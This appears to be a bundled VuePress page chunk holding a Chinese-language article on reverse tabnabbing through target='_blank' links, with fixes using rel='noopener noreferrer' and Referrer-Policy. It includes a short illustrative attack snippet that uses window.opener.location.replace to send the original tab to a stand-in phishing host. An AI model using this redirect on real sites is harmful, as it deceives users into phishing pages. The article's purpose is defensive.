(window.webpackJsonp=window.webpackJsonp||[]).push([[97],{966:function(e,t,a){"use strict";a.r(t);var r=a(1),n=Object(r.a)({},(function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("p",[e._v('通常在网页中使用链接时，很可能会添加一个简单的 target="_blank" 属性到 a 标签上来让浏览器用一个新的标签页来打开一个 URL 地址。但是这一属性正在成为网络钓鱼者攻击的机会。')]),e._v(" "),a("p",[a("strong",[e._v("恶意攻击")]),e._v('\n如果的网站上有一个使用了 target="_blank" 的 a 标签链接，一旦用户点击了这个链接打开了新的标签页，如果这个标签页跳转的网站内存在的恶意代码，那么原本页面的网站可能会被转到一个假的页面。也就是说，当用户回到原本的页面时，他看到的可能就是已经被替换过的钓鱼页面了。')]),e._v(" "),a("p",[a("strong",[e._v("步骤如下：")])]),e._v(" "),a("ol",[a("li",[a("p",[e._v("的网站上有一个 a 标签的链接 "),a("a",{attrs:{href:"https://example.com%EF%BC%9A",target:"_blank",rel:"noopener noreferrer"}},[e._v("https://example.com："),a("OutboundLink")],1)]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<a href="https://an.evil.site" target="_blank">\n  Enter an "evil" website\n</a>\n')])])]),a("ul",[a("li",[e._v("一个用户点击了这个链接在一个新的标签页打开这个新的网站。这个网站可以根据用户跳转新页面的 HTTP 请求中的 header 里的 Referer 字段来确定这个用户的来源。")]),e._v(" "),a("li",[e._v("而这个网站包含类似的 JavaScript code：")])]),e._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("const")]),e._v(" url "),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[e._v("encodeURIComponent")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'{{header.referer}}'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\nwindow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("opener"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("location"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[e._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://a.fake.site/?'")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v("+")]),e._v(" url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\t\n")])])])]),e._v(" "),a("li",[a("p",[e._v("现在，这个用户继续浏览合格新打开的标签页，当这个开始的页面已经加载到 https://a.fake.site/?https%3A%2F%2Fexample.com%2F 之后。")])]),e._v(" "),a("li",[a("p",[e._v("这个恶意的网站 https://a.fake.site 可以根据这个 querystring 部分伪造一个跟原本的页面一样的页面来欺骗用户（其实也可以在这期间制造另一个跳转，让浏览器的地址栏看起来更令人困惑）")])]),e._v(" "),a("li",[a("p",[e._v("当用户关掉这个新标签页（"),a("a",{attrs:{href:"https://an.evil.site%EF%BC%89%E7%84%B6%E5%90%8E%E5%9B%9E%E5%88%B0%E5%BC%80%E5%A7%8B%E7%9A%84%E9%A1%B5%E9%9D%A2%E6%97%B6%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6Oh",target:"_blank",rel:"noopener noreferrer"}},[e._v("https://an.evil.site）然后回到开始的页面时…………Oh"),a("OutboundLink")],1),e._v(", no, 再也回不到开始那个页面了。")])])]),e._v(" "),a("ul",[a("li",[e._v("以上的攻击方式，是在跨域的场景中。因为当跳转的页面跨域时，opener 对象与 parent 是同一个。")]),e._v(" "),a("li",[e._v("虽然，都是受限制的并且只提供了很少的受限的可用属性。并且这一些可用的属性里，大部分都不被允许访问（否则使用时会直接报错 DOMException）。")]),e._v(" "),a("li",[e._v("但是在跨域的场景中，opener 对象不像 parent 对象那么严格，opener 依然可以调用 location.replace 方法。")]),e._v(" "),a("li",[e._v("如果这是同域场景（例如，这个网站上的一个页面已经被嵌入了恶意代码），那么这个情况会变得更加严重。")])]),e._v(" "),a("p",[a("strong",[e._v("预防")]),e._v("\n在 <iframe中有一个 sandbox 属性，所以可以使用以下的一些方法来预防链接：")]),e._v(" "),a("ol",[a("li",[a("p",[a("strong",[e._v("Referrer Policy 和 noreferrer")])]),e._v(" "),a("ul",[a("li",[e._v("在上述的攻击步骤中，有用到 HTTP header 里的 Referer 属性。事实上，可以在当前页面返回的 HTTP Response Headers 中添加 Referrer Policy 头来确保原本网页可以不受新标签页的干扰。")]),e._v(" "),a("li",[e._v("需要修改后端代码（译注：或者 nginx 配置）来实现添加 Referer Policy 头。同时在前端，也可以使用 "),a("code",[e._v("<a")]),e._v('标签本身支持的 rel 属性，通过指明 rel="noreferrer" 来确保原网页不受新标签页的干扰。'),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v(' <a href="https://an.evil.site" target="_blank" rel="noreferrer">\n   Enter an "evil" website\n </a>\n')])])])]),e._v(" "),a("li",[e._v("然而，需要注意的是及时已经限制了 referer 的传递，原网页依旧无法阻止被恶意地重定向。")])])]),e._v(" "),a("li",[a("p",[a("strong",[e._v("noopener")]),e._v('(需要考虑浏览器兼容)\n处于安全的考虑，现代浏览器支持指定 rel="noopener" 在 '),a("code",[e._v("<a")]),e._v("标签上，从而在新打开的标签页里，opener 对象将不可用，其值直接被设置成了 null。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<a href="https://an.evil.site" target="_blank" rel="noopener">\n  Enter an "evil" website\n</a>\n')])])])]),e._v(" "),a("li",[a("p",[a("strong",[e._v("最佳")])]),e._v(" "),a("ol",[a("li",[e._v('首先，可以添加 rel="noopener" 到网站的 a 标签上（也推荐使用 rel="noreferrer"）, 如果算上 target="_blank"，那么看起来大概是这样：'),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<a href="https://an.evil.site" target="_blank"  rel="noopener noreferrer">\n  Enter an "evil" website\n</a>\n')])])])]),e._v(" "),a("li",[e._v('当然，当要跳转到第三方网站的时候，就推荐添加 rel="nofollow" 来调整 SEO 权重。这看起来像：'),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<a href="https://an.evil.site" target="_blank" \n   rel="noopener noreferrer nofollow">\n  Enter an "evil" website\n</a>\n')])])])])])]),e._v(" "),a("li",[a("p",[a("strong",[e._v("性能问题")])]),e._v(" "),a("ul",[a("li",[e._v('最后，来讨论一下性能问题，如果网站使用 <a target="_blank”新打开的标签页的性能就会影响当前打开的页面。在这一点看来，如果在新开的页面里有一个很臃肿的 JavaScript 脚本要执行，那么原本的页面也会受到影响，同时当前页面停滞的现象也可能出现（相当于这两个页面是在同一个线程上）。')]),e._v(" "),a("li",[e._v("如果 noopener 添加到了链接上，那么这新旧两个页面就不能互相插手对方了，也就是说原来的页面不会受到新页面的影响（这两个页面就变成两个线程了）。")])])]),e._v(" "),a("li",[a("p",[a("strong",[e._v("参考")]),e._v("："),a("a",{attrs:{href:"https://zhuanlan.zhihu.com/p/53132574",target:"_blank",rel:"noopener noreferrer"}},[e._v('从未注意的隐藏危险: target = "_blank" 和 "opener"'),a("OutboundLink")],1)])])])])}),[],!1,null,null,null);t.default=n.exports}}]);